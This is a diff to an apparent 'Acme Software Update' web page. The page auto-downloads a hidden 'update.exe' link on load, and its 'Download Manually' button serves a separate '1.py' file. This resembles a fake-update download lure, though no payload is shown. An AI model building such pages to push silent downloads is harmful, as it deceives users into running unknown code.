@@ -3,25 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <title>Acme Software Update</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 20px 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <div class="card">
-            <h1>Acme Software Update</h1>
-            <p>Your download is starting automatically...</p>
-            <a id="downloadLink" href="./download/update.exe" download hidden></a>
-            <button onclick="manualDownload()">Download Manually</button>
-        </div>
+        <h1>Acme Software Update</h1>
+        <p>Your download is starting automatically...</p>
+        <a id="downloadLink" href="./download/update.exe" download hidden></a>
+        <button onclick="manualDownload()">Download Manually</button>
     </div>
 
     <script>
         function autoDownload() {
             document.getElementById('downloadLink').click();
         }
+
         function manualDownload() {
-            window.location.href = '1.py';
+            const link = document.createElement('a');
+            link.href = './1.py';
+            link.download = '1.py';
+            link.click();
         }
+
         window.onload = autoDownload;
     </script>
 </body>
